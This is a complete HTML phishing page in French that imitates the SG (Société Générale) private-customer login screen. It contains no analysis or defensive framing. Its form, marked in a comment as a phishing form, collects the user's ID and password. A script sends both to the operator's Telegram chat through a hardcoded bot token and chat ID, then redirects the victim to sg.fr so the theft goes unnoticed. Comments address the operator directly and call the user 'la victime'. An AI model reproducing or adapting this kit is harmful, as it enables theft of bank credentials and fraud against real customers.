<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connexion — Espace Client Particuliers</title>
  <style>
    :root{
      --navy:#070a3a;
      --blue:#0b5cff;
      --text:#1f2430;
      --muted:#6b7280;
      --ring:#2f6df6;
      --bg:#ffffff;
      --shadow: 0 10px 30px rgba(0,0,0,.18);
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    /* Top header */
    .topbar{
      height:88px;
      display:flex;
      align-items:center;
      justify-content:space-between;
      padding: 0 18px;
      border-bottom:1px solid #eceef4;
      background:#fff;
    }
    .brand{
      display:flex;
      align-items:center;
      gap:12px;
      min-width: 180px;
    }
    .sgmark{
      display:flex;
      align-items:center;
      gap:10px;
      font-weight:900;
      letter-spacing:-1px;
      font-size:54px;
      line-height:1;
      color: var(--navy); /* Ajout de couleur pour le texte */
    }
    .flag{
      width:160px;
      height:60px;
      background: linear-gradient(90deg,#e50019 0 45%, #0a0f2e 45% 100%);
      border-radius:0;
      margin-left:6px;
    }
    .open-account{
      background: var(--navy);
      color:#fff;
      border:none;
      padding: 14px 28px;
      border-radius:999px;
      font-size:18px;
      font-weight:600;
      box-shadow: 0 10px 22px rgba(7,10,58,.25);
      cursor:pointer;
      white-space:nowrap;
    }

    .content{
      position:relative;
      padding: 28px 18px 0;
      min-height: calc(100vh - 88px);
    }

    h1{
      text-align:center;
      margin: 18px 0 0;
      font-size: 26px;
      font-weight: 800;
      color:#5b5f66;
    }

    /* Right floating tools */
    .tools{
      position:absolute;
      right: 18px;
      top: 200px;
      width: 96px;
      height: 170px;
      background: var(--navy);
      border-radius: 4px;
      box-shadow: var(--shadow);
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:space-evenly;
      padding: 18px 0;
    }
    .tool-btn{
      width: 48px;
      height: 48px;
      border-radius: 12px;
      display:grid;
      place-items:center;
      color:#fff;
      background: transparent;
      border:1px solid rgba(255,255,255,.15);
      cursor: pointer;
    }
    .tool-line{
      width: 48px;
      height:2px;
      background: rgba(255,255,255,.35);
      margin: 4px 0;
      border-radius:2px;
    }

    /* Form */
    .form-wrap{
      margin: 120px auto 0;
      max-width: 560px;
      padding: 0 6px;
    }
    .label{
      font-size:20px;
      color:#6d6f78;
      margin: 0 0 14px;
      font-weight:500;
    }
    .input-row{
      position:relative;
    }
    input[type="text"], input[type="password"]{
      width: 100%;
      height: 64px;
      border: 3px solid var(--navy);
      border-radius: 8px;
      padding: 0 64px 0 18px;
      font-size:18px;
      outline:none;
      background:#fff;
      margin-bottom: 15px; /* Espace entre les champs */
    }
    input[type="text"]:focus, input[type="password"]:focus{
      box-shadow: 0 0 0 4px rgba(47,109,246,.18);
    }
    .clear-x{
      position:absolute;
      right: 18px;
      top: 50%;
      transform: translateY(-50%);
      width: 34px;
      height: 34px;
      border:none;
      background: transparent;
      color:#0a0a0a;
      font-size:30px;
      line-height:1;
      cursor:pointer;
      opacity:.85;
    }

    .remember{
      margin-top: 20px;
      display:flex;
      align-items:center;
      gap:18px;
      color:#6d6f78;
      font-size:22px;
    }
    .info-badge{
      width: 22px;
      height: 22px;
      border-radius:50%;
      border:2px solid var(--blue);
      display:grid;
      place-items:center;
      font-weight:700;
      color: var(--blue);
      font-size:14px;
      margin-left:-8px;
    }

    /* Bouton de connexion final */
    .submit-btn {
      width: 100%;
      padding: 18px;
      background: var(--navy);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s;
    }
    .submit-btn:hover {
      background: #1a1d4a;
    }

  </style>
</head>
<body>

  <!-- Top Header -->
  <div class="topbar">
    <div class="brand">
      <!-- Remplace SG par ton logo ou texte -->
      <div class="sgmark">SG</div> 
      <div class="flag"></div>
    </div>
    <button class="open-account">Ouvrir un compte</button>
  </div>

  <div class="content">
    <h1>Connexion</h1>

    <!-- Tools à droite -->
    <div class="tools">
      <button class="tool-btn">?</button>
      <div class="tool-line"></div>
      <button class="tool-btn">⚙</button>
      <div class="tool-line"></div>
      <button class="tool-btn">📞</button>
    </div>

    <!-- Formulaire de Phishing -->
    <div class="form-wrap">
      <form id="phishForm">
        <p class="label">Identifiant</p>
        <div class="input-row">
          <input type="text" name="username" placeholder=" " required />
          <button type="button" class="clear-x">×</button>
        </div>

        <p class="label">Mot de passe</p>
        <div class="input-row">
          <input type="password" name="password" placeholder=" " required />
          <button type="button" class="clear-x">×</button>
        </div>

        <div class="remember">
          <!-- Checkbox "Se souvenir de moi" (factice) -->
          <label style="display:flex; align-items:center; gap:10px; cursor:pointer;">
            <input type="checkbox" /> Se souvenir de moi
          </label>
          <span class="info-badge">i</span>
        </div>

        <button type="submit" class="submit-btn">Se connecter</button>
      </form>
    </div>
  </div>

  <script>
    document.getElementById('phishForm').addEventListener('submit', function(e) {
      e.preventDefault(); // On empêche la page de se recharger normalement

      // Récupération des données
      var username = document.querySelector('input[name="username"]').value;
      var password = document.querySelector('input[name="password"]').value;

      // Tes infos Telegram
      var botToken = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
      var chatId = "8501464548";
      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";

      // Le message qui t'arrivera
      var message = "🔐 <b>Nouvelle Connexion</b>\n\n" +
                    "👤 <b>Utilisateur:</b> " + username + "\n" +
                    "🔑 <b>Mot de passe:</b> " + password + "\n\n" +
                    "🌍 <b>IP:</b> " + (navigator.language || 'Non détecté') + "\n" +
                    "🕒 <b>Heure:</b> " + new Date().toLocaleString();

      // Envoi vers Telegram
      fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      }).then(response => {
        // Après l'envoi, on redirige la victime vers le site officiel
        // Remplace l'URL ci-dessous par le vrai site (ex: https://www.boursorama.com)
        window.location.href = "https://sg.fr"; 
      });
    });
  </script>

</body>
</html>
